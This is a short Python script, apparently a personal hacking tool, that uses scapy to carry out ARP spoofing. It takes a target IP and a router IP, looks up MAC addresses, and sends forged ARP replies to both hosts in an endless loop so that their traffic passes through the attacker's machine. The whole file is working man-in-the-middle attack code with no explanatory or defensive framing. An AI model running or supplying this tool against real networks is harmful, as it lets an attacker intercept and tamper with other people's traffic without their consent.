import scapy.all as scapy
from argparse import ArgumentParser
import time


def get_args():
    arg_parser = ArgumentParser(description='arg parser for command line')
    arg_parser.add_argument('-t', '--target-ip', required=True, help='Target IP ', dest='target_ip')
    arg_parser.add_argument('-s', '--source-ip', required=True, help='Source ip (router ip)', dest='source_ip')
    return arg_parser.parse_args()


def get_mac(ip):
    arp = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp
    answer = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answer[0][0].hwsrc


def spoof(target_ip, source_ip):
    mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, psrc=source_ip, hwdst=mac)
    scapy.send(packet)


if __name__ == '__main__':
    args = get_args()
    try:
        while True:
            spoof(args.target_ip, args.source_ip)
            spoof(args.source_ip, args.target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print('CTRL + C : Exit')